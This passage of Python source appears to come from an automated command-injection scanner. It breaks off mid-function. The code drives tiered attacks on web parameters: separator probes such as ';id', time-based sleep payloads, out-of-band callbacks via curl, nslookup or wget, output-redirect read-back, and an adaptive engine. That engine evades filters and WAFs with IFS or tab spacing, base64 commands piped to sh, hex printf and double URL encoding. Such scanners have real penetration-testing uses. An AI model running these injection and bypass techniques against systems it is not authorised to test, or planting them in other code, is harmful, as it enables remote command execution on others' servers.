                rest = [p for p in tier1_payloads if not p[1].startswith("WV:")]
                tier1_payloads = wv + rest

            confirmed_vtypes = set()
            # FIX 4: Track static hits per separator family, not globally.
            # Old behaviour: 2 consecutive static hits anywhere in Tier 1 aborted
            # the whole tier — meaning ;echo and &&echo both static would cause
            # |echo (different separator, potentially unfiltered) to be skipped.
            # New: only abort a separator family when it produces 2 static hits.
            # Only abort the entire tier when ALL separator families are exhausted.
            _t1_sep_static: dict = {}   # sep -> consecutive static count
            _T1_SEP_FAMILIES = {";", "&&", "|", "$(", "`", "&", "||", "\n", "%0a", "x`", "x$(", "'", '"', "--"}
            _t1_dead_seps: set = set()
            for pl, pl_tmpl, desc, verify_type, is_time, pl_os in tier1_payloads:
                vk = verify_type.split(":")[0]
                if vk in confirmed_vtypes:
                    continue
                _t1_sep = self._sep(pl_tmpl)
                # Skip entire separator family if already confirmed dead
                if _t1_sep in _t1_dead_seps:
                    vdim(f"  [{param}] Tier1 sep {_t1_sep!r} confirmed dead — skipping {desc}")
                    continue
                ok, ev, used_pl, st, el, _ = self._run_payload(
                    endpoint, param, pl, pl_tmpl, desc, verify_type, is_time, pl_os,
                    baseline_time, baseline_body, _redir_dirs, _redir_file)
                if ok:
                    confirmed_vtypes.add(vk)
                    confirmed_sep = self._sep(pl_tmpl)
                    self._record_vuln(endpoint, param, used_pl, desc, verify_type,
                                      is_time, pl_os, ev, st, el, baseline_time,
                                      confirmed_sep=confirmed_sep,
                                      param_enc=self._enc_for(param)["encoding"])
                    ep_vulns += 1
                    param_confirmed = True
                    break
                else:
                    # Per-separator static tracking
                    _psc_now = self._param_static_count.get(param, 0)
                    _prev = _t1_sep_static.get(_t1_sep, 0)
                    if _psc_now > _prev:
                        _t1_sep_static[_t1_sep] = _psc_now
                        if _t1_sep_static[_t1_sep] >= 2:
                            vdim(f"  [{param}] sep {_t1_sep!r} static x2 — marking dead")
                            _t1_dead_seps.add(_t1_sep)
                    else:
                        _t1_sep_static[_t1_sep] = 0  # non-static response reset
                    # Abort only when every known sep family is dead
                    if _T1_SEP_FAMILIES.issubset(_t1_dead_seps | {s for s in _t1_dead_seps}):
                        vdim(f"  [{param}] all sep families dead in Tier 1 — aborting tier")
                        break

            if param_confirmed:
                continue

            # ── TIER 2: Time-based blind ──────────────────────────────────
            vdim(f"[{param}] → Tier 2: time-based blind")
            time_confirmed = False
            # Inst 2: skip time probes if adaptive baseline says endpoint is
            # too slow or too noisy for reliable timing discrimination.
            if getattr(self, '_adaptive_time_skip_current', False):
                vdim(f"  [{param}] Tier 2 skipped — timing baseline unsuitable")
            else:
                # Track separator families confirmed dead this param.
                # ;sleep 10 returned fast → ;sleep 5 and ;id will too — skip the family.
                _t2_dead_seps: set = set()

                for pl, pl_tmpl, desc, verify_type, is_time, pl_os in self.payloads_time:
                    vk = verify_type.split(":")[0]
                    if vk in confirmed_vtypes:
                        continue

                    # Dead-separator skip: if this separator already returned fast, skip siblings
                    _t2_sep = self._sep(pl_tmpl)
                    if _t2_sep in _t2_dead_seps:
                        vdim(f"  [{param}] sep {_t2_sep!r} confirmed dead — skipping {desc}")
                        continue

                    sys.stdout.write(f"\r  {color(f'  [{param}] time-delay probing...', C.DIM)}  ")
                    sys.stdout.flush()
                    _samp, _lr = [], None

                    # Extract the sleep duration from the payload to set fast-bail threshold.
                    _sleep_secs = 10.0
                    _sl_m = re.search(r'sleep\s+(\d+)|ping.*-n\s+(\d+)|timeout.*/t\s+(\d+)', pl_tmpl, re.I)
                    if _sl_m:
                        _sleep_secs = float(next(g for g in _sl_m.groups() if g))

                    for _att in range(3):
                        _rs = self._send(endpoint, param, pl)
                        if _rs.get('status', 0) != 0 or is_time:
                            _samp.append(_rs.get('elapsed', 0.0))
                        _lr = _rs

                        if not _samp:
                            break  # status=0 on first attempt

                        _last_t = _samp[-1]
                        # Fast bail after first sample: if response came back well
                        # under sleep_secs, the payload didn't execute.
                        # FIX 3: Threshold reduced from 30% to 20% of sleep duration.
                        # Sandboxed/containerised targets add 2-4s overhead before sleep
                        # even starts — bailing at 3s on a sleep-10 was killing real detections.
                        # Now only bail if elapsed < 20% of sleep_secs, giving overhead room.
                        _bail_thresh = max(baseline_time * 1.5, _sleep_secs * 0.2)
                        if _att == 0 and _last_t < _bail_thresh:
                            vdim(f"  [{param}] fast-bail: {_last_t:.2f}s < {_bail_thresh:.2f}s — sep {_t2_sep!r} dead")
                            _t2_dead_seps.add(_t2_sep)
                            break
                        # Early exit: second sample also fast
                        if len(_samp) >= 2 and _last_t < baseline_time * 0.5:
                            break

                    if len(_samp) < 1 or _lr is None: continue
                    _samp.sort()
                    _med = _samp[len(_samp) // 2]
                    _precomp = {**_lr, 'elapsed': _med}
                    ok, ev, used_pl, st, el, _ = self._run_payload(
                        endpoint, param, pl, pl_tmpl, desc, verify_type, is_time, pl_os,
                        baseline_time, baseline_body, _redir_dirs, _redir_file,
                        precomputed_resp=_precomp, use_differential_timing=True)
                    if ok:
                        confirmed_vtypes.add(vk)
                        confirmed_sep = self._sep(pl_tmpl)
                        self._record_vuln(endpoint, param, used_pl, desc, verify_type,
                                          is_time, pl_os, ev, st, el, baseline_time,
                                          confirmed_sep=confirmed_sep,
                                          param_enc=self._enc_for(param)["encoding"])
                        ep_vulns += 1
                        time_confirmed = True
                        param_confirmed = True
                        break

            # ── TIER 3: OOB upgrade (only after time_confirmed) ───────────
            # Injection already confirmed by timing. Goal: upgrade evidence
            # from BLIND:TIME-DELAY to BLIND:OOB-CONFIRMED via network callback.
            # OOB NEVER fires without a prior timing confirmation.
            if time_confirmed:
                vdim(f"[{param}] \u2192 Tier 3: OOB upgrade (injection confirmed by timing)")
                sys.stdout.write(f"\r  {color(f'  [{param}] OOB upgrade...', C.DIM)}  ")
                sys.stdout.flush()
                oob_upgraded = self._attempt_oob_upgrade(
                    endpoint, param, confirmed_sep, baseline_time, baseline_body)
                if oob_upgraded:
                    vdim(f"[{param}] OOB upgrade succeeded \u2014 BLIND:OOB-CONFIRMED")
                else:
                    vdim(f"[{param}] OOB upgrade: no callback \u2014 keeping BLIND:TIME-DELAY finding")

            # ── TIER 4: Output redirect (only if Tier 2 failed) ──────────
            if not time_confirmed:
                vdim(f"[{param}] → Tier 4: output redirect")
                confirmed_vtypes = set()
                _redir_consec_404 = 0  # 404 count on pre-write probe — bail early if all dirs dead
                for pl, pl_tmpl, desc, verify_type, is_time, pl_os in self.payloads_redirect:
                    vk = "redirect"
                    if vk in confirmed_vtypes:
                        continue
                    # If every redirect dir returned 404 on the previous payload's
                    # pre-write probe, the server can't serve written files at all.
                    # No point firing more redirect payloads — abort Tier 4 entirely.
                    if _redir_consec_404 >= len(_redir_dirs):
                        vdim(f"  [{param}] all {len(_redir_dirs)} redirect dirs returned 404 — aborting Tier 4")
                        break
                    sys.stdout.write(f"\r  {color(f'  [{param}] redirect read-back...', C.DIM)}  ")
                    sys.stdout.flush()
                    ok, ev, used_pl, st, el, _dir_404s = self._run_payload(
                        endpoint, param, pl, pl_tmpl, desc, verify_type, is_time, pl_os,
                        baseline_time, baseline_body, _redir_dirs, _redir_file)
                    _redir_consec_404 = _dir_404s  # updated count from this payload's dir sweep
                    if ok:
                        confirmed_vtypes.add(vk)
                        self._record_vuln(endpoint, param, used_pl, desc, verify_type,
                                          is_time, pl_os, ev, st, el, baseline_time,
                                          confirmed_sep=confirmed_sep,
                                          param_enc=self._enc_for(param)["encoding"])
                        ep_vulns += 1
                        param_confirmed = True
                        break

            if param_confirmed:
                continue  # param done — move to next param

            # ── TIER 5: ADAPTIVE BYPASS ───────────────────────────────────
            vdim(f"[{param}] \u2192 Tier 5: adaptive bypass")
            # Only reached when Tiers 1-4 all failed.

            # ── Inst 3+4: Lazy filter fingerprinting ──────────────────────
            # Only runs when Tiers 1-4 have all failed — avoids the 32+ extra
            # HTTP probes on every param.  If ALL shell metachar are blocked,
            # run arg-inject instead of the normal adaptive tier.
            if not _ff_escalate_arginject:
                _ff_allowed, _ff_escalate_arginject = self._fingerprint_filter(
                    endpoint, param)
                if _ff_allowed is not None:
                    _fp_str = "".join(sorted(_ff_allowed)) if _ff_allowed else "(none)"
                    vdim(f"  [{param}] filter fingerprint (Tier5 gate): {_fp_str!r}")
            if _ff_escalate_arginject:
                vdim(f"  [{param}] Inst4: all metachar blocked — running arg-inject tier")
                tier5_found = self._run_arg_inject_tier(
                    endpoint, param, baseline_time, baseline_body,
                    _redir_dirs, _redir_file)
                if tier5_found:
                    param_confirmed = True
                # Skip normal Tier 5 — arg-inject is the appropriate tier here
            else:
                tier5_found = self._run_adaptive_tier(
                    endpoint, param, baseline_time, baseline_body,
                    _redir_dirs, _redir_file, param_location
                )
                if tier5_found:
                    param_confirmed = True

            # ── Per-param static exhaust check (fallback) ─────────────────
            # Catches params that varied slightly but never confirmed injection.
            # Upfront probe already handles the clean-static case; this catches
            # params that passed the upfront probe but still returned all static
            # responses during actual payload testing.
            if not param_confirmed:
                _miss_count = self._param_static_count.get(param, 0)
                if _miss_count >= 2:
                    _param_static_done.add(param)
                    vdim(f"  [{param}] static across payloads — marking insensitive")

            # ── Endpoint-level abort — all params insensitive ──────────────
            if _param_static_done and set(params_list) == _param_static_done:
                # Still extract routes from baseline body before aborting.
                _ab_body = baseline_body or ""
                if _ab_body:
                    _ld_set2 = getattr(self, '_late_discovered_paths', None)
                    if _ld_set2 is not None:
                        if _ab_body.lstrip().startswith(("{", "[")):
                            try:
                                import json as _ab_json
                                _ab_data = _ab_json.loads(_ab_body)
                                _SLUG_AB = re.compile(r'^/[a-zA-Z0-9]{5,12}$')
                                _STATIC_AB = re.compile(
                                    r'\.(js|css|png|jpg|gif|svg|ico|woff|map|pdf|ttf|eot)$', re.I)
                                def _ab_walk(node):
                                    if isinstance(node, dict):
                                        for v in node.values(): _ab_walk(v)
                                    elif isinstance(node, list):
                                        for item in node: _ab_walk(item)
                                    elif isinstance(node, str):
                                        v = node.strip()
                                        if (v.startswith("/") and 3 <= len(v) <= 80
                                                and " " not in v
                                                and "http" not in v
                                                and "://" not in v
                                                and not _STATIC_AB.search(v)
                                                and not v.startswith("//")
                                                and ("/" in v[1:] or bool(_SLUG_AB.match(v)))):
                                            _ld_set2.add(v.split("?")[0].rstrip("/") or "/")
                                _ab_walk(_ab_data)
                            except Exception:
                                pass
                vdim("Endpoint fully insensitive — all params returned static responses. Aborting.")
                _endpoint_abort = True

    def _attempt_oob_upgrade(self, endpoint, param, separator, baseline_time,
                              baseline_body):
        """
        Fire OOB callback payloads (curl/nslookup/wget) targeting the self-hosted
        listener. Called only after injection has already been confirmed by timing
        or direct output — goal is evidence quality upgrade, not discovery.

        If a callback arrives within the poll window:
          - Record a new BLIND:OOB-CONFIRMED finding (separate from the Tier 2 entry)
          - Return True

        If no callback within poll window:
          - Return False  (Tier 2 finding stands as-is)

        Never fires payloads at params that haven't confirmed injection first.
        """
        if not self.payloads_oob:
            return False
        import random as _rand
        _poll_t = _rand.randint(8, 12)
        for pl, pl_tmpl, desc, verify_type, is_time, pl_os in self.payloads_oob:
            if pl_os not in ("both", self.os_target) and not self.run_both:
                continue
            try:
                ok, used_pl, ev = self._try_oob(
                    endpoint, param, pl_tmpl, verify_type, baseline_body)
                if ok:
                    # Record the OOB-confirmed finding — separate entry with upgraded type
                    self._record_vuln(
                        endpoint, param, used_pl,
                        f"[OOB-UPGRADE] {desc}",
                        "oob_data",       # always oob_data — we have a network callback
                        False,            # not time-based — callback is direct evidence
                        pl_os, ev, 200, 0.0, baseline_time,
                        confirmed_sep=separator,
                        param_enc="none")
                    return True
            except Exception:
                continue
        return False

    def _run_adaptive_tier(self, endpoint, param, baseline_time, baseline_body,
                           redir_dirs, redir_file, param_location="query"):
        # Tier 5: full adaptive bypass engine.
        # Called only after Tiers 1-4 all failed for this param.
        # Returns True if a vuln was confirmed, False otherwise.
        # (Return value used by test_endpoint to decide whether to run Tier 6 self-OOB.)
        #   5A  Space bypass (IFS / tab / brace / newline)
        #   5B  Whole-value Base64  -- entire param = b64(shell_cmd)
        #   5C  Command B64 wrap    -- sep + echo b64|base64 -d|sh
        #   5D  Double-B64          -- b64(b64(cmd))
        #   5E  Hex printf          -- printf '\xHH...'|sh
        #   5F  URL + Base64 combo  -- %0a/%3b + b64-wrapped cmd
        #   5G  Double-URL          -- %253b %2520 etc.
        #   5H  dd TAB delay        -- dd\tif=/dev/zero (no sleep, no spaces)
        #
        # param_location: 'query' or 'body' — WAFs apply different rules per
        # location; this is logged so the analyst knows which context fired.
        #
        # Timing (all timed payloads):
        #   1. Collect BASELINE_SAMPLES clean responses -> median
        #   2. Send timed payload up to 3x -> take max elapsed
        #   3. Differential: send sleep-0/dd-ctrl 3x -> take min
        #   4. Confirm: max_sleep >= baseline+jitter+threshold
        #               AND min_ctrl < threshold*0.7
        #               AND ratio >= TIMING_RATIO_MIN (2.5x)

        sys.stdout.write("\r  " + color("  [" + param + "] adaptive bypass...", C.DIM + C.BYELLOW) + "  ")
        sys.stdout.flush()

        # Step 1: probe raw ;id -> collect filter/error signal
        probe_val    = endpoint["params"].get(param, "test") + ";id"
        probe_params = {**endpoint["params"], param: probe_val}
        try:
            if endpoint["method"] == "GET":
                filter_resp = self.client.get(endpoint["url"], probe_params)
            else:
                filter_resp = self.client.post(
                    endpoint["url"],
                    {**endpoint.get("hidden", {}), **probe_params})
            filter_body = filter_resp.get("body", "")
        except Exception:
            filter_body = ""

        # Step 2: classify error
        # 'app_decode_error' → endpoint pre-processes input before shell:
        #   promote WV b64 payloads to the front of the queue
        # 'type_conversion'  → int param, no shell path, skip entirely
        err_class = AdaptiveBypass.classify_error(filter_body)
        if err_class == "type_conversion":
            vdim(f"  [{param}] type-sanitized — skip adaptive tier")
            return False

        # Detect whether the endpoint pre-decodes the param (b64/json/url)
        # Done ONCE here so it doesn't block every payload iteration.
        # Re-use per-param encoding state from fingerprinting phase.
        # Only re-probe if not yet set (e.g. adaptive tier invoked standalone).
        _penc_adaptive = self._enc_for(param)
        input_encoding = _penc_adaptive["encoding"]
        if input_encoding == "none":
            input_encoding = _detect_input_encoding(self.client, endpoint, param)
            if input_encoding != "none":
                self._set_enc_state(param, input_encoding, replace=(input_encoding == "base64"))
        if input_encoding != "none":
            sys.stdout.write(
                "\r  " + color(
                    "  [" + param + "] input-encoding detected: " + input_encoding +
                    " — promoting WV payloads", C.DIM + C.BYELLOW
                ) + "  "
            )
            sys.stdout.flush()

        # Step 3: detect active filters from error body
        detected_filters = AdaptiveBypass.detect_filters(filter_body)

        # If app_decode_error: add 'base64' to detected_filters so the
        # filter-aware payload reordering (below) promotes multi-layer encoding
        if err_class == "app_decode_error":
            detected_filters.add("base64")

        # If input_validation: parse WHICH constraint was violated and add the
        # matching bypass filter so the agent automatically switches technique.
        # e.g. "Spaces not allowed" → add 'no_space' → IFS/tab variants promoted.
        # This is distinct from WAF: the app told us exactly what to avoid.
        if err_class == "input_validation":
            body_lc = filter_body.lower()
            if re.search(r"space|whitespace", body_lc):
                detected_filters.add("no_space")
                sys.stdout.write(
                    "\r  " + color(
                        "  [" + param + "] input_validation: spaces blocked → IFS/tab bypass",
                        C.DIM + C.BYELLOW) + "  ")
                sys.stdout.flush()
            if re.search(r"semicolon|;", body_lc):
                detected_filters.add("no_semicolon")
                sys.stdout.write(
                    "\r  " + color(
                        "  [" + param + "] input_validation: semicolons blocked → pipe/newline bypass",
                        C.DIM + C.BYELLOW) + "  ")
                sys.stdout.flush()
            if re.search(r"pipe|\|", body_lc):
                detected_filters.add("no_pipe")
                sys.stdout.write(
                    "\r  " + color(
                        "  [" + param + "] input_validation: pipes blocked → subshell/$() bypass",
                        C.DIM + C.BYELLOW) + "  ")
                sys.stdout.flush()
            if re.search(r"special.char|illegal.char|character.not.allow", body_lc):
                detected_filters.add("no_space")
                detected_filters.add("no_semicolon")

        if detected_filters:
            fstr = ", ".join(sorted(detected_filters))
            loc_note = f" [{param_location}]"
            sys.stdout.write("\r  " + color("  [" + param + "] filters: " + fstr + loc_note, C.DIM + C.BYELLOW) + "  ")
            sys.stdout.flush()

        # Step 4: collect fresh statistical timing baseline (BASELINE_SAMPLES requests)
        try:
            stat_baseline = AdaptiveBypass.measure_baseline(
                self.client, endpoint, param,
                samples=AdaptiveBypass.BASELINE_SAMPLES
            )
        except Exception:
            stat_baseline = baseline_time

        # Step 5: generate and REORDER payloads based on detected signals
        all_payloads = AdaptiveBypass.generate_bypass_payloads(
            self.token, self.os_target, detected_filters
        )

        # Step 5a: survived_chars pre-filter.
        # If _detect_sanitization_endpoints fingerprinted this endpoint+param,
        # drop any payload that leads with a separator not in survived_chars.
        # This avoids wasting attempts on chars we already know are stripped.
        # Only applied when survived_chars is non-empty (empty set = unknown,
        # i.e. plain-text detection without JSON fingerprinting — don't filter).
        _sc_key = (endpoint["url"], endpoint["method"], param)
        _survived = self._survived_chars.get(_sc_key)  # frozenset or None
        if _survived:  # non-empty frozenset → filter
            _SEP_MAP = {
                ";": ";", "|": "|", "&&": "&&",
                "\n": "\n", "%0a": "\n", "%0A": "\n",
                "\t": "\t", "${IFS}": "${IFS}",
            }
            def _pl_sep(pl: str):
                """Return the leading separator char(s) of payload, or None."""
                for sep_str, canon in _SEP_MAP.items():
                    if pl.startswith(sep_str):
                        return canon
                return None
            filtered = []
            dropped = 0
            for entry in all_payloads:
                pl_sep = _pl_sep(entry[0])
                if pl_sep is not None and pl_sep not in _survived:
                    dropped += 1
                    continue
                filtered.append(entry)
            if dropped:
                vdim(f"  [{param}] survived_chars filter: dropped {dropped} payloads, "
                     f"{len(filtered)} remain (survived={sorted(_survived)})")
            all_payloads = filtered

        # ── Payload reordering rules (applied in priority order) ──────────
        # R1: input_encoding=='base64' → WV payloads first (endpoint decodes b64)
        # R2: 'no_space' filter detected → all IFS/tab payloads first
        # R3: 'base64' filter or app_decode_error → multi-layer (5D/5G) before 5C
        # R4: 'waf' filter → dd-based payloads (5H) promoted (no blocked keywords)
        #
        # The original list order (5A→5I) is preserved within each group —
        # this is a stable sort that only moves groups, not individual entries.

        def _tier(desc: str) -> int:
            """Return sort-bucket for payload desc under current filter context."""
            # When endpoint pre-decodes b64 — WV payloads are most likely to work
            if input_encoding == "base64":
                if desc.startswith("5B") or "WV" in desc:
                    return 0
                if desc.startswith("5D") or "DblB64" in desc:
                    return 1
                if desc.startswith("5C") or "B64-wrap" in desc:
                    return 2
            # Space filter → IFS/tab first
            if "no_space" in detected_filters:
                if desc.startswith("5A") and ("IFS" in desc or "tab" in desc or "brace" in desc):
                    return 0
            # WAF keyword filter → dd delay first for time-based
            if "waf" in detected_filters:
                if desc.startswith("5H"):
                    return 0
            # b64 filter or app_decode_error → promote double encoding
            if "base64" in detected_filters or err_class == "app_decode_error":
                if desc.startswith("5D") or "DblB64" in desc or "DblURL" in desc or desc.startswith("5G"):
                    return 0
                if desc.startswith("5C") or "B64-wrap" in desc:
                    return 1
            return 99  # default: keep original position

        # Stable reorder: group by _tier bucket, preserve within-group order
        tiered = sorted(enumerate(all_payloads), key=lambda x: _tier(x[1][2]))
        all_payloads = [entry for _, entry in tiered]

        confirmed_vtypes = set()

        for pl, pl_tmpl, desc, verify_type, is_time, pl_os in all_payloads:
            if pl_os not in ("both", self.os_target) and not self.run_both:
                continue
            vk = verify_type.split(":")[0]
            if vk in confirmed_vtypes:
                continue

            is_whole_value = pl_tmpl.startswith("WV:")

            # -- Whole-value timed payload: full 3-sample statistical timing protocol --
            if is_whole_value and is_time:
                confirmed, ev = self._wv_timing_test(
                    endpoint, param, pl, pl_tmpl, desc,
                    stat_baseline, detected_filters)
                if confirmed:
                    confirmed_vtypes.add(vk)
                    self._record_vuln(endpoint, param, pl,
                                      f"[ADAPTIVE/{param_location}] {desc}", verify_type,
                                      is_time, pl_os, ev, 200,
                                      stat_baseline + self.time_threshold + 1.0,
                                      stat_baseline,
                                      confirmed_sep=";",
                                      param_enc=input_encoding)
                    # OOB upgrade: injection confirmed by timing — attempt callback upgrade
                    self._attempt_oob_upgrade(
                        endpoint, param, ";", stat_baseline, baseline_body)
                    return True
                continue

            # -- Whole-value direct-output payload --
            if is_whole_value:
                resp = self._send_replace(endpoint, param, pl)
                if resp["status"] == 0:
                    continue
                if verify_type == "echo":
                    if self.token.lower() not in resp.get("body", "").lower():
                        continue
                    ok, ev = self.verifier.verify_echo(
                        endpoint, param, ";", resp["body"], baseline_body)
                elif verify_type.startswith("system:"):
                    ok, ev = self.verifier.verify_system(
                        verify_type.split(":", 1)[1],
                        resp.get("body", ""), baseline_body)
                else:
                    continue
                if ok:
                    confirmed_vtypes.add(vk)
                    self._record_vuln(endpoint, param, pl,
                                      f"[ADAPTIVE/{param_location}] {desc}", verify_type,
                                      is_time, pl_os, ev,
                                      resp["status"], resp["elapsed"],
                                      stat_baseline,
                                      confirmed_sep=";",
                                      param_enc=input_encoding)
                    return True
                continue

            # -- Standard append-mode payload, differential timing if timed --
            ok, ev, used_pl, st, el, _ = self._run_payload(
                endpoint, param, pl, pl_tmpl, desc, verify_type, is_time, pl_os,
                stat_baseline, baseline_body, redir_dirs, redir_file,
                use_differential_timing=is_time)

            if ok:
                confirmed_vtypes.add(vk)
                _sep_used = self._sep(pl_tmpl)
                self._record_vuln(endpoint, param, used_pl,
                                  f"[ADAPTIVE/{param_location}] {desc}", verify_type,
                                  is_time, pl_os, ev, st, el, stat_baseline,
                                  confirmed_sep=_sep_used,
                                  param_enc=input_encoding)
                # OOB upgrade: if this was a timed payload, attempt callback upgrade
                if is_time:
                    self._attempt_oob_upgrade(
                        endpoint, param, _sep_used, stat_baseline, baseline_body)
                return True   # one confirmed vuln per param is sufficient

        return False  # all adaptive payloads exhausted, nothing found

    def _set_enc_state(self, param, encoding, replace=False):
        """Record detected encoding state for a param. Called once per param
        during fingerprinting; persists for all subsequent tiers so no tier
        ever falls back to plain-text append when replace-mode is required."""
        self._param_enc_state[param] = {"encoding": encoding, "replace": replace}

    def _enc_for(self, param):
        """Return encoding state for param. Defaults to no-encoding append-mode."""
        return self._param_enc_state.get(param, {"encoding": "none", "replace": False})

    def _send_replace(self, endpoint, param, payload):
        """Send request where payload COMPLETELY REPLACES the param value.
        Used for whole-value Base64 payloads where param = base64(shell_cmd)."""
        injected = {**endpoint["params"], param: payload}
        if endpoint["method"] == "GET":
            return self.client.get(endpoint["url"], injected)
        else:
            return self.client.post(
                endpoint["url"],
                {**endpoint.get("hidden", {}), **injected})

    def _wv_timing_test(self, endpoint, param, sleep_payload, pl_tmpl, desc,
                        stat_baseline, detected_filters):
        """
        Full statistical timing test for whole-value Base64 timed payloads.
        Example: sleep_payload = b64("sleep 10") = "c2xlZXAgMTA="

        Protocol (minimum 3-5 requests for accuracy):
          1. stat_baseline = median of BASELINE_SAMPLES clean requests (pre-collected)
          2. Send sleep payload up to 3 times -> take MAX elapsed
          3. Build matching sleep-0 control (same encoding as sleep payload):
               b64("sleep 0") or dbl-b64 or url+b64 depending on pl_tmpl
          4. Send sleep-0 control 3 times -> take MIN elapsed (fastest)
          5. Confirm ALL THREE conditions:
               max_sleep  >= stat_baseline + JITTER_PAD + threshold
               min_ctrl   <  threshold * 0.7
               ratio      >= TIMING_RATIO_MIN (2.5x)
        Returns (confirmed: bool, evidence: str).
        """
        threshold = self.time_threshold
        jpad      = AdaptiveBypass.TIMING_JITTER_PAD
        rmin      = AdaptiveBypass.TIMING_RATIO_MIN

        sys.stdout.write("\r  " + color("  [" + param + "] WV-b64 timing (" + desc + ")...", C.DIM + C.BYELLOW) + "  ")
        sys.stdout.flush()

        # -- Send timed payload: up to 3 attempts, take max elapsed --
        sleep_times = []
        for _attempt in range(3):
            try:
                resp = self._send_replace(endpoint, param, sleep_payload)
                sleep_times.append(resp["elapsed"])
            except Exception:
                pass
            # Early-stop if delay is already clearly confirmed
            if sleep_times and max(sleep_times) >= stat_baseline + jpad + threshold:
                break
        if not sleep_times:
            return False, ""
        max_sleep = max(sleep_times)

        # Quick gate: must exceed baseline + jitter + threshold
        if max_sleep < stat_baseline + jpad + threshold:
            return False, ""

        # -- Build sleep-0 control with matching encoding --
        if "DblB64" in pl_tmpl or "b64(b64" in pl_tmpl:
            ctrl = AdaptiveBypass._b64(AdaptiveBypass._b64("sleep 0"))
        elif "dblurl(b64" in pl_tmpl:
            ctrl = AdaptiveBypass._url_enc(AdaptiveBypass._b64("sleep 0"), double=True)
        elif "urlenc(b64" in pl_tmpl:
            ctrl = AdaptiveBypass._url_enc(AdaptiveBypass._b64("sleep 0"))
        elif "IFS" in pl_tmpl:
            ctrl = AdaptiveBypass._b64("sleep${IFS}0")
        elif "dd-delay" in pl_tmpl or "dd_delay" in pl_tmpl:
            # dd control: count=1 reads 1 byte — near-instant, same encoding
            ctrl = AdaptiveBypass.dd_ctrl_b64()
        else:
            ctrl = AdaptiveBypass.whole_value_b64_sleep0_payload()

        # -- Send sleep-0 control: 3 attempts, take min elapsed --
        ctrl_times = []
        for _attempt in range(3):
            try:
                ctrl_resp = self._send_replace(endpoint, param, ctrl)
                ctrl_times.append(ctrl_resp["elapsed"])
            except Exception:
                pass
        if not ctrl_times:
            return False, ""
        min_ctrl = min(ctrl_times)

        # Control must be fast -- rejects naturally slow endpoints
        if min_ctrl >= threshold * 0.7:
            return False, ("sleep-0 ctrl also slow (" + str(round(min_ctrl, 1)) + "s) -- endpoint naturally slow")

        # Ratio check: sleep_10 / sleep_0 must be >= 2.5x
        ratio = max_sleep / max(min_ctrl, 0.1)
        if ratio < rmin:
            return False, (
                "ratio " + str(round(ratio, 1)) + "x insufficient "
                "(sleep=" + str(round(max_sleep, 1)) + "s ctrl=" + str(round(min_ctrl, 1)) + "s)"
            )

        ev = (
            "WV-B64 differential timing confirmed: "
            "sleep=" + str(round(max_sleep, 1)) + "s "
            "ctrl=" + str(round(min_ctrl, 1)) + "s "
            "(ratio " + str(round(ratio, 1)) + "x, "
            "baseline=" + str(round(stat_baseline, 2)) + "s) "
            "payload=" + pl_tmpl
        )
        return True, ev


    def _sep_from_finding(self, finding):
        """Return the confirmed separator stored on a finding, defaulting to ';'."""
        return finding.get("confirmed_sep", ";") or ";"

    def _endpoint_for_finding(self, finding):
        """
        Reconstruct a minimal endpoint dict from a finding so _do_file_read
        can replay the request. Uses the stored base_params and hidden_params.
        Returns None if the finding lacks sufficient context.
        """
        url = finding.get("endpoint")
        method = finding.get("method")
        if not url or not method:
            return None
        return {
            "url":    url,
            "method": method,
            "params": dict(finding.get("base_params", {})),
            "hidden": dict(finding.get("hidden_params", {})),
            "source": finding.get("source", "finding"),
        }

    def run(self, endpoints):
        section("PHASE 4/4 — INJECTION TESTING")
        total_params = sum(len(ep["params"]) for ep in endpoints)
        os_s = self.os_target.upper()
        techs = ["direct-output", "time-blind", "redirect"]
        if self.collab_url:
            techs += ["oob-collab", "oob-exfil"]
        techs += ["adaptive-bypass(5A-5H)"]
        tprint(f"  {info(f'token: {color(self.token, C.BMAGENTA, C.BOLD)}  |  {len(endpoints)} endpoints ~{total_params} params  |  OS: {os_s}')}")
        _arrow = " → "
        tprint(f"  {info(f'auto-escalation: {color(_arrow.join(techs), C.BCYAN)}')}")

        # ── Two-pass injection: normal params first, headers last ───────────
        # Header injection is a last-resort technique — expensive (modifies
        # every request header) and generates a lot of noise on simple targets.
        # Only run it after all normal endpoints are tested.
        normal_eps  = [ep for ep in endpoints if ep.get("source") != "header_inject"]
        header_eps  = [ep for ep in endpoints if ep.get("source") == "header_inject"]

        # Use a deque for normal_eps so late-discovered endpoints can be
        # inserted at the front of the remaining queue in O(1).
        from collections import deque as _deque
        normal_queue = _deque(normal_eps)

        # Track which real paths have already been queued/tested so we
        # don't re-add the same late-discovered path multiple times.
        _tested_urls: set = {ep["url"] for ep in endpoints}

        # Lightweight path extractor for injection responses.
        # Only looks at string values in JSON that start with / and are 3–80 chars.
        _STATIC_LATE = re.compile(
            r'\.(js|css|png|jpg|gif|svg|ico|woff|map|pdf|ttf|eot)$', re.I)
        _SLUG_LATE   = re.compile(r'^/[a-zA-Z0-9]{5,12}$')
        def _late_paths_from_body(body):
            if not body:
                return set()
            found = set()
            try:
                import json as _json
                data = _json.loads(body)
                def _walk(node):
                    if isinstance(node, dict):
                        for v in node.values(): _walk(v)
                    elif isinstance(node, list):
                        for item in node: _walk(item)
                    elif isinstance(node, str):
                        v = node.strip()
                        if (v.startswith("/") and 3 <= len(v) <= 80
                                and " " not in v
                                and "http" not in v
                                and "://" not in v
                                and not _STATIC_LATE.search(v)
                                and not v.startswith("//")
                                and ("/" in v[1:] or bool(_SLUG_LATE.match(v)))):
                            found.add(v.split("?")[0].rstrip("/") or "/")
                _walk(data)
            except Exception:
                pass
            return found

        total = len(endpoints)
        done  = 0

        # Pass 1 — normal endpoints (query params, POST body, form fields)
        while normal_queue:
            ep = normal_queue.popleft()
            done += 1
            # ── test this endpoint ────────────────────────────────────────
            self.test_endpoint(ep, done, total)
            pct = int(done / total * 100)
            sys.stdout.write(f"\r  {color(f'  testing {done}/{total} ({pct}%)', C.DIM)}  ")
            sys.stdout.flush()
            # ── Fix 2: drain _late_discovered_paths after each endpoint ──────
            # Paths were extracted from every injection response body in real time
            # by _run_payload.  Now probe each new path, build an endpoint entry,
            # and insert it at the FRONT of the queue so it is tested immediately.
            self._last_response_bodies = []  # reset legacy stash
            _newly_queued = 0
            _drain_paths = set(getattr(self, '_late_discovered_paths', set()))
            self._late_discovered_paths = set()  # reset for next endpoint
            for _lp in _drain_paths:
                _lfull = urllib.parse.urljoin(ep["url"], _lp)
                if _lfull in _tested_urls:
                    continue
                _tested_urls.add(_lfull)
                try:
                    _lr = self.client.get(_lfull)
                    if _lr["status"] in (0, 404, 410):
                        _lr = self.client.post(_lfull, {})
